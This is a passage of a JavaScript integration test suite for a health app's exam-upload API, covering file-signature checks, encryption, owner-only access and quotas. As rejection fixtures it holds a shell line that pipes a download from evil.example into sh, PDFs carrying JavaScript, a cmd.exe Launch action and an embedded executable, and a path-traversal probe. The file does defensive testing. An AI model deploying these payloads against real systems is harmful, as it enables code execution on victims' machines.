// Pruebas del módulo de exámenes (integrador, punto 15) contra el servidor y
// la base de un entorno DESCARTABLE: subir, validar por firma, cifrar,
// servir solo al dueño, cuotas, auditoría, supresión, fusión y purga.
//
//   BASE_URL=http://127.0.0.1:3204 DATABASE_ADMIN_URL=postgres://postgres:…@127.0.0.1:55444/pulso \
//   MAILPIT_URL=http://127.0.0.1:18024 MEDIA_DIR=/ruta/de/media/del/servidor \
//     node --test --test-concurrency=1 tests/integrador/examenes.test.mjs
//
// Sin BASE_URL (o con el servidor apagado) se saltea todo; sin
// DATABASE_ADMIN_URL, los casos que miran la base; sin MEDIA_DIR, los que
// miran el disco. Crean cuentas y borran datos: se niegan a correr contra
// producción.

import { describe, test, before, beforeEach, after } from "node:test";
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { createHash, randomBytes, randomUUID } from "node:crypto";
import { existsSync } from "node:fs";
import { readFile, readdir, stat, utimes, writeFile, rm } from "node:fs/promises";
import net from "node:net";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { deflateSync } from "node:zlib";
import pg from "pg";

const RAIZ = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
const BASE = process.env.BASE_URL?.replace(/\/+$/, "");
const ADMIN = process.env.DATABASE_ADMIN_URL;
const MAILPIT = process.env.MAILPIT_URL?.replace(/\/+$/, "");
const MEDIA = process.env.MEDIA_DIR ? path.resolve(process.env.MEDIA_DIR) : null;

if (BASE && /agustinynatalia\.site/.test(BASE)) {
  throw new Error("Estas pruebas crean cuentas y borran datos: no se corren contra producción.");
}
if (ADMIN && /:5433\//.test(ADMIN)) {
  throw new Error("El puerto 5433 es el túnel a la base de producción: usa la base descartable.");
}

async function responde(url) {
  try {
    return (await fetch(url, { signal: AbortSignal.timeout(5000) })).status < 500;
  } catch {
    return false;
  }
}

// La base descartable hace falta en todas: entre bloque y bloque se vacían los
// contadores de subidas de las cuentas de prueba (30 por hora, ver tasa.ts).
const SALTEAR = !BASE ? "falta BASE_URL"
  : !ADMIN ? "falta DATABASE_ADMIN_URL (base descartable)"
  : (await responde(`${BASE}/api/movil/v1/sesion`)) ? false : `el servidor no responde en ${BASE}`;
const SIN_ADMIN = SALTEAR;
const SIN_DISCO = SALTEAR || (!MEDIA ? "falta MEDIA_DIR (el del servidor)" : false);

// ─── Ayudas ───────────────────────────────────────────────────────────────────

/** IP de documentación (RFC 3849) por usuario de prueba: no se pisan los límites por IP. */
function nuevaIp() {
  const h = () => randomBytes(2).toString("hex");
  return `2001:db8:${h()}:${h()}::${h()}`;
}

const sha256 = (b) => createHash("sha256").update(b).digest("hex");
const hashToken = (t) => createHash("sha256").update(t).digest("hex");

let pool = null;
const admin = () => (pool ??= new pg.Pool({ connectionString: ADMIN, max: 3 }));

const creadas = [];

/** Token de una identidad nueva (sesión de la app nativa: Bearer). */
async function nuevaSesion(ip = nuevaIp()) {
  const res = await fetch(`${BASE}/api/movil/v1/sesion`, { method: "POST", headers: { "X-Forwarded-For": ip } });
  const cuerpo = await res.json();
  assert.equal(res.status, 200, `sesión: ${JSON.stringify(cuerpo)}`);
  return { token: cuerpo.token, ip };
}

/** Token del enlace de activación que llegó a Mailpit. */
async function tokenDeActivacion(email) {
  for (let i = 0; i < 40; i++) {
    const r = await fetch(`${MAILPIT}/api/v1/search?query=${encodeURIComponent(`to:"${email}"`)}`);
    const lista = await r.json();
    const id = lista.messages?.[0]?.ID;
    if (id) {
      const m = await (await fetch(`${MAILPIT}/api/v1/message/${id}`)).json();
      const t = `${m.Text ?? ""} ${m.HTML ?? ""}`.match(/token=([A-Za-z0-9_-]{43})/)?.[1];
      if (t) return t;
    }
    await new Promise((r) => setTimeout(r, 250));
  }
  throw new Error(`no llegó el correo de activación a ${email}`);
}

/**
 * Cuenta activada sobre una sesión Bearer, por el camino real: registro, el
 * enlace del correo (Mailpit) y la activación. Sin Mailpit, la activa el dueño
 * de la base.
 */
async function nuevaCuenta() {
  const { token, ip } = await nuevaSesion();
  const email = `examenes-${randomBytes(5).toString("hex")}@pulso.test`;
  const password = "Lab#Exam9Kq2Zv";
  const auth = { Authorization: `Bearer ${token}`, "X-Forwarded-For": ip };
  const reg = await fetch(`${BASE}/api/cuenta/registro`, {
    method: "POST",
    headers: { ...auth, "Content-Type": "application/json" },
    body: JSON.stringify({ email, password }),
  });
  assert.equal(reg.status, 200, `registro: ${await reg.text()}`);

  if (MAILPIT) {
    const act = await fetch(`${BASE}/api/cuenta/activar`, {
      method: "POST",
      headers: { "X-Forwarded-For": ip, "Content-Type": "application/json" },
      body: JSON.stringify({ token: await tokenDeActivacion(email) }),
    });
    assert.equal(act.status, 200, `activación: ${await act.text()}`);
  } else {
    await admin().query(
      "update cuentas set verificada_at = now() where uid = (select uid from sesiones where token_hash = $1)",
      [hashToken(token)]
    );
  }
  const cuenta = { token, ip, email, auth };
  creadas.push(cuenta);
  const lista = await fetch(`${BASE}/api/examenes`, { headers: auth });
  assert.equal(lista.status, 200, "la cuenta recién activada lista sus exámenes");
  return cuenta;
}

async function uidDe(cuenta) {
  const { rows } = await admin().query("select uid from sesiones where token_hash = $1", [hashToken(cuenta.token)]);
  return rows[0]?.uid;
}

/** POST /api/examenes como lo hace la página: el archivo como cuerpo y el nombre en un header. */
async function subir(cuenta, nombre, bytes, tipoDeclarado = "application/octet-stream") {
  const res = await fetch(`${BASE}/api/examenes`, {
    method: "POST",
    headers: { ...cuenta.auth, "Content-Type": tipoDeclarado, "X-Nombre-Archivo": encodeURIComponent(nombre) },
    body: bytes,
  });
  const json = await res.json().catch(() => null);
  return { status: res.status, json, res };
}

async function bajar(cuenta, id, descargar = true) {
  const res = await fetch(`${BASE}/api/examenes/${id}${descargar ? "?descargar=1" : ""}`, { headers: cuenta.auth });
  return { status: res.status, res, bytes: Buffer.from(await res.arrayBuffer()) };
}

async function listar(cuenta) {
  const res = await fetch(`${BASE}/api/examenes`, { headers: cuenta.auth });
  assert.equal(res.status, 200);
  return res.json();
}

/** Último evento de auditoría de esa acción para el uid. */
async function ultimaAuditoria(uid, accion) {
  const { rows } = await admin().query(
    "select resultado, recurso_id, detalle from auditoria where uid = $1 and accion = $2 order by id desc limit 1",
    [uid, accion]
  );
  return rows[0];
}

/** Vacía los contadores de subidas de estas cuentas: cada bloque empieza con el cupo entero. */
async function reiniciarLimites(...cuentas) {
  for (const c of cuentas) {
    await admin().query("delete from limites_tasa where clave = any($1)", [[`examen:${await uidDe(c)}`, `examenIp:${c.ip}`]]);
  }
}

async function filaDe(id) {
  const { rows } = await admin().query("select * from examenes where id = $1", [id]);
  return rows[0];
}

const archivoEnDisco = (archivo) => path.join(MEDIA, "examenes", archivo);

async function archivosEnDisco() {
  try {
    return await readdir(path.join(MEDIA, "examenes"));
  } catch {
    return [];
  }
}

// ─── Archivos de prueba ───────────────────────────────────────────────────────

/** PDF real de un productor real (pdfTeX/Tectonic, con streams de objetos comprimidos). */
const PDF_REAL = await readFile(path.join(RAIZ, "docs/informe-seguridad/informe-seguridad.pdf"));
const PNG_REAL = await readFile(path.join(RAIZ, "public/icons/icon-192.png"));
/** JPG de 24×16 hecho con Pillow. */
const JPG = Buffer.from(
  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAA0JCgsKCA0LCgsODg0PEyAVExISEyccHhcgLikxMC4pLSwzOko+MzZGNywtQFdBRkxOUlNSMj5aYVpQYEpRUk//2wBDAQ4ODhMREyYVFSZPNS01T09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0//wAARCAAQABgDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwDt5ZLuS/kgt5YI1jiRyXiLkliw7MP7tL5epf8AP3af+Azf/HKSWO7jv5J7eKCRZIkQh5ShBUseyn+9S+ZqX/Ppaf8AgS3/AMbp+pev2bfgJFJdx38cFxLBIskTuCkRQgqVHdj/AHqKIo7uS/jnuIoI1jidAElLklip7qP7tFUiJ9D/2Q==",
  "base64"
);

/** Encabezado de un .exe de Windows: `MZ`, el stub de DOS y la firma PE. */
const EXE = Buffer.concat([
  Buffer.from("MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff", "latin1"),
  Buffer.alloc(46),
  Buffer.from([0x80, 0, 0, 0]),
  Buffer.from("\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21This program cannot be run in DOS mode.\r\r\n$", "latin1"),
  Buffer.alloc(40),
  Buffer.from("PE\x00\x00\x4c\x01", "latin1"),
  randomBytes(2048),
]);
const ELF = Buffer.concat([Buffer.from("\x7fELF\x02\x01\x01", "latin1"), randomBytes(1024)]);
const SCRIPT = Buffer.from("#!/bin/sh\ncurl -s https://evil.example/x | sh\n");

/** PDF mínimo válido con xref correcta, a partir de los cuerpos de sus objetos. */
function pdf(objetos) {
  const partes = [Buffer.from("%PDF-1.7\n%\xe2\xe3\xcf\xd3\n", "latin1")];
  const offsets = [];
  let pos = partes[0].length;
  objetos.forEach((cuerpo, i) => {
    offsets.push(pos);
    const b = Buffer.concat([Buffer.from(`${i + 1} 0 obj\n`), Buffer.isBuffer(cuerpo) ? cuerpo : Buffer.from(cuerpo, "latin1"), Buffer.from("\nendobj\n")]);
    partes.push(b);
    pos += b.length;
  });
  let xref = `xref\n0 ${objetos.length + 1}\n0000000000 65535 f \n`;
  for (const o of offsets) xref += `${String(o).padStart(10, "0")} 00000 n \n`;
  xref += `trailer\n<< /Size ${objetos.length + 1} /Root 1 0 R >>\nstartxref\n${pos}\n%%EOF\n`;
  partes.push(Buffer.from(xref, "latin1"));
  return Buffer.concat(partes);
}

function stream(dicc, datos) {
  return Buffer.concat([Buffer.from(`<< ${dicc} /Length ${datos.length} >>\nstream\n`, "latin1"), datos, Buffer.from("\nendstream", "latin1")]);
}

const pagina = (extraCatalogo = "") => [
  `<< /Type /Catalog /Pages 2 0 R ${extraCatalogo}>>`,
  "<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
  "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>",
  stream("/Filter /FlateDecode", deflateSync(Buffer.from("BT /F1 24 Tf 72 700 Td (Hemograma completo) Tj ET"))),
  "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
];

/** Stream de objetos comprimido con un objeto adentro (el 7). */
function objStm(objeto) {
  const cab = "7 0 ";
  return stream(`/Type /ObjStm /N 1 /First ${cab.length} /Filter /FlateDecode`, deflateSync(Buffer.from(cab + objeto)));
}

const PDF_SIMPLE = pdf(pagina());
const PDF_JS = pdf([...pagina("/OpenAction 6 0 R "), "<< /S /JavaScript /JS (app.alert('hola')) >>"]);
const PDF_JS_ESCAPADO = pdf([...pagina("/OpenAction 6 0 R "), "<< /S /J#61va#53cript /J#53 (app.alert(1)) >>"]);
const PDF_JS_COMPRIMIDO = pdf([...pagina("/OpenAction 7 0 R "), objStm("<< /S /Rendition /JS (app.alert(1)) >>")]);
const PDF_LAUNCH = pdf([...pagina("/OpenAction 6 0 R "), "<< /S /Launch /Win << /F (cmd.exe) /P (/c calc) >> >>"]);
const PDF_ADJUNTO = pdf([
  ...pagina("/Names << /EmbeddedFiles << /Names [(a.exe) 6 0 R] >> >> "),
  "<< /Type /Filespec /F (a.exe) /EF << /F 7 0 R >> >>",
  stream("/Type /EmbeddedFile", EXE.subarray(0, 64)),
]);

// ─── Pruebas ──────────────────────────────────────────────────────────────────

let a; // dueño de los exámenes
let b; // otro usuario

before(async () => {
  if (SALTEAR) return;
  a = await nuevaCuenta();
  b = await nuevaCuenta();
});

beforeEach(async () => {
  if (!SALTEAR && a && b) await reiniciarLimites(a, b);
});

after(async () => {
  if (!SALTEAR) {
    // Supresión por la API: borra filas y archivos de cada cuenta de prueba.
    for (const c of creadas) {
      await fetch(`${BASE}/api/mis-datos`, { method: "DELETE", headers: c.auth }).catch(() => {});
    }
  }
  await pool?.end();
});

describe("E1 PDF real: se acepta, se lista y se baja igual", { skip: SALTEAR }, () => {
  let id;

  test("subir un PDF real (pdfTeX, con streams de objetos) → 201 con el tipo detectado", async () => {
    const r = await subir(a, "Hemograma marzo 2026.pdf", PDF_REAL, "application/pdf");
    assert.equal(r.status, 201, JSON.stringify(r.json));
    assert.equal(r.json.examen.tipo, "pdf");
    assert.equal(r.json.examen.bytes, PDF_REAL.length);
    assert.equal(r.json.examen.nombre, "Hemograma marzo 2026.pdf");
    id = r.json.examen.id;
  });

  test("aparece en la lista con su nombre (descifrado), tipo, tamaño y fecha; y en la cuota", async () => {
    const { examenes, cuota } = await listar(a);
    const ex = examenes.find((e) => e.id === id);
    assert.ok(ex, "el examen está en la lista");
    assert.deepEqual({ nombre: ex.nombre, tipo: ex.tipo, bytes: ex.bytes }, { nombre: "Hemograma marzo 2026.pdf", tipo: "pdf", bytes: PDF_REAL.length });
    assert.ok(!Number.isNaN(Date.parse(ex.created_at)));
    assert.equal(cuota.maxExamenes, 50);
    assert.ok(cuota.examenes >= 1 && cuota.bytes >= PDF_REAL.length);
  });

  test("se baja byte por byte igual, con headers seguros", async () => {
    const r = await bajar(a, id);
    assert.equal(r.status, 200);
    assert.equal(sha256(r.bytes), sha256(PDF_REAL), "mismo contenido que el subido");
    const h = r.res.headers;
    assert.equal(h.get("content-type"), "application/pdf");
    assert.equal(h.get("x-content-type-options"), "nosniff");
    assert.match(h.get("cache-control") ?? "", /no-store/);
    assert.match(h.get("content-disposition") ?? "", /^attachment; filename="Hemograma marzo 2026\.pdf"; filename\*=UTF-8''Hemograma%20marzo%202026\.pdf$/);
    assert.match(h.get("content-security-policy") ?? "", /default-src 'none'/);
  });

  test("sin ?descargar=1 el navegador lo muestra (inline)", async () => {
    const r = await bajar(a, id, false);
    assert.equal(r.status, 200);
    assert.match(r.res.headers.get("content-disposition") ?? "", /^inline;/);
  });

  test("la subida queda en la auditoría con el tipo detectado", { skip: SIN_ADMIN }, async () => {
    const ev = await ultimaAuditoria(await uidDe(a), "examen.subir");
    assert.equal(ev.resultado, "ok");
    assert.equal(ev.recurso_id, id);
    assert.equal(ev.detalle.tipo, "pdf");
  });
});

describe("E2 .exe renombrado a .pdf: rechazado con un mensaje claro", { skip: SALTEAR }, () => {
  test("415 archivo_ejecutable con el mensaje para el usuario", async () => {
    const antes = SIN_DISCO ? [] : await archivosEnDisco();
    const r = await subir(a, "resultados-laboratorio.pdf", EXE, "application/pdf");
    assert.equal(r.status, 415);
    assert.equal(r.json.error, "archivo_ejecutable");
    assert.equal(
      r.json.mensaje,
      "El archivo es un programa ejecutable con la extensión cambiada. Solo se aceptan PDF, JPG o PNG reales."
    );
    if (!SIN_DISCO) assert.deepEqual(await archivosEnDisco(), antes, "no se escribió nada en disco");
  });

  test("el rechazo queda auditado con su motivo, lo detectado y el MIME declarado (que no se usó)", { skip: SIN_ADMIN }, async () => {
    const ev = await ultimaAuditoria(await uidDe(a), "examen.subir");
    assert.equal(ev.resultado, "denegado");
    assert.equal(ev.detalle.motivo, "archivo_ejecutable");
    assert.equal(ev.detalle.detectado, "windows_pe");
    assert.equal(ev.detalle.mime_declarado, "application/pdf");
    assert.equal(ev.detalle.extension, "pdf");
    assert.ok(!JSON.stringify(ev.detalle).includes("resultados-laboratorio"), "el nombre del archivo no va a la auditoría");
  });

  test("ELF renombrado a .jpg y script #! renombrado a .png: también ejecutables", async () => {
    for (const [nombre, bytes] of [["foto.jpg", ELF], ["radiografia.png", SCRIPT]]) {
      const r = await subir(a, nombre, bytes);
      assert.equal(r.status, 415, nombre);
      assert.equal(r.json.error, "archivo_ejecutable", nombre);
    }
  });
});

describe("E3 la firma tiene que coincidir con la extensión", { skip: SALTEAR }, () => {
  test("JPG con extensión .pdf → 415 firma_no_coincide, diciendo qué es en realidad", async () => {
    const r = await subir(a, "examen.pdf", JPG, "application/pdf");
    assert.equal(r.status, 415);
    assert.equal(r.json.error, "firma_no_coincide");
    assert.match(r.json.mensaje, /en realidad un JPG, pero su extensión es \.pdf/);
  });

  test("PDF con extensión .png y texto plano con extensión .pdf → rechazados", async () => {
    let r = await subir(a, "imagen.png", PDF_SIMPLE);
    assert.equal(r.json?.error, "firma_no_coincide");
    r = await subir(a, "nota.pdf", Buffer.from("Resultado: normal\n"));
    assert.equal(r.status, 415);
    assert.equal(r.json.error, "firma_no_coincide");
  });

  test("el MIME declarado no cuenta: un PNG declarado como application/pdf se guarda y se sirve como image/png", async () => {
    const r = await subir(a, "electro.png", PNG_REAL, "application/pdf");
    assert.equal(r.status, 201, JSON.stringify(r.json));
    assert.equal(r.json.examen.tipo, "png");
    const d = await bajar(a, r.json.examen.id, false);
    assert.equal(d.res.headers.get("content-type"), "image/png");
    assert.match(d.res.headers.get("content-security-policy") ?? "", /sandbox/);
    assert.equal(sha256(d.bytes), sha256(PNG_REAL));
  });

  test("JPG real con extensión .jpeg → aceptado", async () => {
    const r = await subir(a, "orina.jpeg", JPG, "image/jpeg");
    assert.equal(r.status, 201, JSON.stringify(r.json));
    assert.equal(r.json.examen.tipo, "jpg");
  });

  test("extensiones fuera de la lista → 415 extension_no_permitida", async () => {
    for (const nombre of ["virus.exe", "foto.gif", "sin-extension", "pagina.html", "examen.pdf.exe"]) {
      const r = await subir(a, nombre, PDF_SIMPLE);
      assert.equal(r.status, 415, nombre);
      assert.equal(r.json.error, "extension_no_permitida", nombre);
    }
  });

  test("un nombre con U+202E (texto invertido) no esconde un .exe", async () => {
    // Se ve como "cartaexe.pdf", pero termina en .exe.
    const r = await subir(a, "carta\u202Efdp.exe", EXE);
    assert.equal(r.json?.error, "extension_no_permitida");
  });

  test("archivo vacío → 400 archivo_vacio", async () => {
    const r = await subir(a, "vacio.pdf", Buffer.alloc(0));
    assert.equal(r.status, 400);
    assert.equal(r.json.error, "archivo_vacio");
  });
});

describe("E4 PDF con contenido activo", { skip: SALTEAR }, () => {
  test("PDF con /JavaScript → 415 pdf_con_contenido_activo", async () => {
    const r = await subir(a, "resultado.pdf", PDF_JS, "application/pdf");
    assert.equal(r.status, 415);
    assert.equal(r.json.error, "pdf_con_contenido_activo");
    assert.match(r.json.mensaje, /JavaScript/);
  });

  test("también escondido: nombres con escapes #xx y código dentro de un stream de objetos comprimido", async () => {
    for (const [caso, bytes] of [["escapado", PDF_JS_ESCAPADO], ["comprimido", PDF_JS_COMPRIMIDO]]) {
      const r = await subir(a, `${caso}.pdf`, bytes);
      assert.equal(r.json?.error, "pdf_con_contenido_activo", caso);
    }
  });

  test("/Launch y archivos incrustados → rechazados", async () => {
    for (const [caso, bytes] of [["launch", PDF_LAUNCH], ["adjunto", PDF_ADJUNTO]]) {
      const r = await subir(a, `${caso}.pdf`, bytes);
      assert.equal(r.json?.error, "pdf_con_contenido_activo", caso);
    }
  });

  test("la auditoría dice qué nombres activos encontró", { skip: SIN_ADMIN }, async () => {
    await subir(a, "resultado.pdf", PDF_JS);
    const ev = await ultimaAuditoria(await uidDe(a), "examen.subir");
    assert.equal(ev.detalle.motivo, "pdf_con_contenido_activo");
    assert.deepEqual(ev.detalle.nombres_pdf, ["JS", "JavaScript"]);
  });

  test("un PDF sin contenido activo hecho a mano → aceptado", async () => {
    const r = await subir(a, "simple.pdf", PDF_SIMPLE);
    assert.equal(r.status, 201, JSON.stringify(r.json));
  });
});

/** Petición HTTP a mano: manda los headers y solo `enviar` bytes del cuerpo, y espera la respuesta. */
function peticionCruda({ headers, enviar, chunked = false, espera = 15_000 }) {
  const { hostname, port } = new URL(BASE);
  return new Promise((resolve, reject) => {
    const s = net.connect(Number(port || 80), hostname);
    let respuesta = "";
    const tiempo = setTimeout(() => {
      s.destroy();
      reject(new Error("el servidor no respondió: esperaba el cuerpo entero"));
    }, espera);
    s.on("data", (d) => {
      respuesta += d.toString("latin1");
      if (/\r\n\r\n/.test(respuesta)) {
        clearTimeout(tiempo);
        s.destroy();
        resolve(respuesta);
      }
    });
    s.on("error", (e) => {
      clearTimeout(tiempo);
      if (respuesta) resolve(respuesta);
      else reject(e);
    });
    s.on("connect", () => {
      s.write(`POST /api/examenes HTTP/1.1\r\nHost: ${hostname}:${port}\r\nConnection: close\r\n` +
        Object.entries(headers).map(([k, v]) => `${k}: ${v}\r\n`).join("") + "\r\n");
      const bloque = randomBytes(64 * 1024);
      let enviados = 0;
      const escribir = () => {
        while (enviados < enviar) {
          const parte = bloque.subarray(0, Math.min(bloque.length, enviar - enviados));
          enviados += parte.length;
          const ok = chunked
            ? s.write(Buffer.concat([Buffer.from(`${parte.length.toString(16)}\r\n`), parte, Buffer.from("\r\n")]))
            : s.write(parte);
          if (!ok) return void s.once("drain", escribir);
        }
        // A propósito no se termina el cuerpo (ni el chunk final): si el servidor
        // esperara todo antes de responder, se colgaría hasta el timeout.
      };
      escribir();
    });
  });
}

describe("E5 demasiado grande: se rechaza sin leerlo entero", { skip: SALTEAR }, () => {
  test("Content-Length de 50 MB: 413 enseguida, habiendo mandado solo 256 KB", async () => {
    const r = await peticionCruda({
      headers: {
        Authorization: a.auth.Authorization, "X-Forwarded-For": a.ip, "X-Nombre-Archivo": "grande.pdf",
        "Content-Type": "application/pdf", "Content-Length": String(50 * 1024 * 1024),
      },
      enviar: 256 * 1024,
    });
    assert.match(r, /^HTTP\/1\.1 413 /);
  });

  test("sin Content-Length (chunked): se corta al pasar los 10 MB, sin esperar el final", async () => {
    const r = await peticionCruda({
      headers: {
        Authorization: a.auth.Authorization, "X-Forwarded-For": a.ip, "X-Nombre-Archivo": "grande.pdf",
        "Content-Type": "application/pdf", "Transfer-Encoding": "chunked",
      },
      enviar: 10 * 1024 * 1024 + 128 * 1024,
      chunked: true,
    });
    assert.match(r, /^HTTP\/1\.1 413 /);
  });

  test("con fetch, 10 MB + 1 byte → 413 archivo_demasiado_grande con el mensaje", async () => {
    const r = await subir(a, "grande.pdf", Buffer.concat([Buffer.from("%PDF-1.7\n"), Buffer.alloc(10 * 1024 * 1024 - 8)]));
    assert.equal(r.status, 413);
    assert.equal(r.json.error, "archivo_demasiado_grande");
    assert.match(r.json.mensaje, /10 MB/);
  });

  test("el rechazo queda auditado", { skip: SIN_ADMIN }, async () => {
    const ev = await ultimaAuditoria(await uidDe(a), "examen.subir");
    assert.equal(ev.detalle.motivo, "archivo_demasiado_grande");
  });
});

describe("E6 solo el dueño", { skip: SALTEAR }, () => {
  let id;
  before(async () => {
    const r = await subir(a, "colesterol.pdf", PDF_SIMPLE);
    assert.equal(r.status, 201);
    id = r.json.examen.id;
  });

  test("otro usuario no lo ve, no lo baja y no lo borra (404, igual que si no existiera)", async () => {
    const { examenes } = await listar(b);
    assert.ok(!examenes.some((e) => e.id === id), "no está en la lista del otro");
    assert.equal((await bajar(b, id)).status, 404);
    const del = await fetch(`${BASE}/api/examenes/${id}`, { method: "DELETE", headers: b.auth });
    assert.equal(del.status, 404);
    assert.equal((await bajar(a, id)).status, 200, "el dueño lo sigue bajando");
    assert.equal((await bajar(b, randomUUID())).status, 404, "uno inexistente responde lo mismo");
    assert.equal((await bajar(b, "../../etc/passwd")).status, 404);
  });

  test("el intento queda en la auditoría como denegado, con el id", { skip: SIN_ADMIN }, async () => {
    const ev = await ultimaAuditoria(await uidDe(b), "examen.eliminar");
    assert.equal(ev.resultado, "denegado");
    assert.equal(ev.recurso_id, id);
    const { rows } = await admin().query(
      "select count(*)::int as n from auditoria where uid = $1 and accion = 'examen.descargar' and resultado = 'denegado' and recurso_id = $2",
      [await uidDe(b), id]
    );
    assert.ok(rows[0].n >= 1);
  });

  test("en la base, RLS: pulso_app con el uid del otro no ve la fila", { skip: SIN_ADMIN }, async () => {
    const c = await admin().connect();
    try {
      await c.query("begin");
      await c.query("set local role pulso_app");
      await c.query("select set_config('app.uid', $1, true)", [await uidDe(b)]);
      assert.equal((await c.query("select * from examenes where id = $1", [id])).rowCount, 0);
      assert.equal((await c.query("delete from examenes where id = $1", [id])).rowCount, 0);
      await c.query("select set_config('app.uid', $1, true)", [await uidDe(a)]);
      assert.equal((await c.query("select * from examenes where id = $1", [id])).rowCount, 1);
      await assert.rejects(c.query("update examenes set bytes = 1 where id = $1", [id]), /permission denied/);
    } finally {
      await c.query("rollback").catch(() => {});
      c.release();
    }
  });

  test("sin sesión → 401; con una sesión sin cuenta → 401 cuenta_requerida", async () => {
    assert.equal((await fetch(`${BASE}/api/examenes/${id}`)).status, 401);
    const anon = await nuevaSesion();
    const r = await fetch(`${BASE}/api/examenes`, {
      method: "POST",
      headers: { Authorization: `Bearer ${anon.token}`, "X-Forwarded-For": anon.ip, "X-Nombre-Archivo": "x.pdf" },
      body: PDF_SIMPLE,
    });
    assert.equal(r.status, 401);
    assert.equal((await r.json()).error, "cuenta_requerida");
  });

  test("Origin de otro sitio → 403", async () => {
    const r = await fetch(`${BASE}/api/examenes`, {
      method: "POST",
      headers: { ...a.auth, Origin: "https://evil.example", "X-Nombre-Archivo": "x.pdf" },
      body: PDF_SIMPLE,
    });
    assert.equal(r.status, 403);
  });
});

describe("E7 cifrado en disco y en la base", { skip: SIN_DISCO }, () => {
  let id;
  let fila;
  before(async () => {
    const r = await subir(a, "Perfil lipídico — Ana.pdf", PDF_SIMPLE);
    assert.equal(r.status, 201);
    id = r.json.examen.id;
    fila = await filaDe(id);
  });

  test("el archivo en disco no es el PDF: está cifrado (IV + etiqueta + datos)", async () => {
    const enDisco = await readFile(archivoEnDisco(fila.archivo));
    assert.notEqual(enDisco.subarray(0, 5).toString("latin1"), "%PDF-");
    assert.equal(enDisco.indexOf(Buffer.from("Hemograma")), -1, "no aparece el texto del PDF");
    assert.equal(enDisco.length, PDF_SIMPLE.length + 12 + 16);
    assert.equal(((await stat(archivoEnDisco(fila.archivo))).mode & 0o777).toString(8), "600");
  });

  test("la ruta no depende del uid y el nombre original va cifrado en la base", async () => {
    const uid = await uidDe(a);
    assert.match(fila.archivo, /^[0-9a-f]{32}$/);
    assert.ok(!fila.archivo.includes(uid.replace(/-/g, "")));
    assert.match(fila.nombre_cifrado, /^v1\./);
    assert.ok(!fila.nombre_cifrado.includes("lip"), "el nombre no está en claro");
  });

  test("un archivo alterado en disco no se entrega (500 genérico, sin detalles)", async () => {
    const ruta = archivoEnDisco(fila.archivo);
    const original = await readFile(ruta);
    const alterado = Buffer.from(original);
    alterado[alterado.length - 1] ^= 0x01;
    await writeFile(ruta, alterado);
    try {
      const r = await bajar(a, id);
      assert.equal(r.status, 500);
      assert.deepEqual(JSON.parse(r.bytes.toString()), { error: "error_interno" });
    } finally {
      await writeFile(ruta, original);
    }
    assert.equal((await bajar(a, id)).status, 200);
  });

  test("borrar: se va la fila y el archivo", async () => {
    const r = await fetch(`${BASE}/api/examenes/${id}`, { method: "DELETE", headers: a.auth });
    assert.equal(r.status, 200);
    assert.equal(await filaDe(id), undefined);
    assert.equal(existsSync(archivoEnDisco(fila.archivo)), false);
    assert.equal((await bajar(a, id)).status, 404);
  });
});

describe("E8 cuotas y límite de tasa", { skip: SIN_ADMIN }, () => {
  let c;
  let uid;
  before(async () => {
    c = await nuevaCuenta();
    uid = await uidDe(c);
  });

  test("50 exámenes por usuario: el 51 → 409 cuota_excedida", async () => {
    // 49 filas de relleno (sin archivo) puestas por el dueño de la base.
    await admin().query(
      `insert into examenes (uid, archivo, nombre_cifrado, tipo, bytes)
       select $1, encode(gen_random_bytes(16), 'hex'), 'v1.relleno', 'pdf', 1000 from generate_series(1, 49)`,
      [uid]
    );
    assert.equal((await subir(c, "50.pdf", PDF_SIMPLE)).status, 201);
    const r = await subir(c, "51.pdf", PDF_SIMPLE);
    assert.equal(r.status, 409);
    assert.equal(r.json.error, "cuota_excedida");
    assert.match(r.json.mensaje, /máximo de 50/);
    const ev = await ultimaAuditoria(uid, "examen.subir");
    assert.equal(ev.detalle.motivo, "cuota_excedida");
    await admin().query("delete from examenes where uid = $1 and nombre_cifrado = 'v1.relleno'", [uid]);
  });

  test("100 MB por usuario: pasarse → 409 con el mensaje de espacio", async () => {
    // Relleno hasta quedar a 10 bytes del tope (el trigger también frena al dueño de la base).
    const { rows } = await admin().query("select coalesce(sum(bytes), 0)::bigint as s from examenes where uid = $1", [uid]);
    for (let falta = 100 * 1024 * 1024 - Number(rows[0].s) - 10; falta > 0; falta -= 10 * 1024 * 1024) {
      await admin().query(
        `insert into examenes (uid, archivo, nombre_cifrado, tipo, bytes)
         values ($1, encode(gen_random_bytes(16), 'hex'), 'v1.relleno', 'pdf', $2)`,
        [uid, Math.min(falta, 10 * 1024 * 1024)]
      );
    }
    const r = await subir(c, "uno-mas.pdf", PDF_SIMPLE);
    assert.equal(r.status, 409);
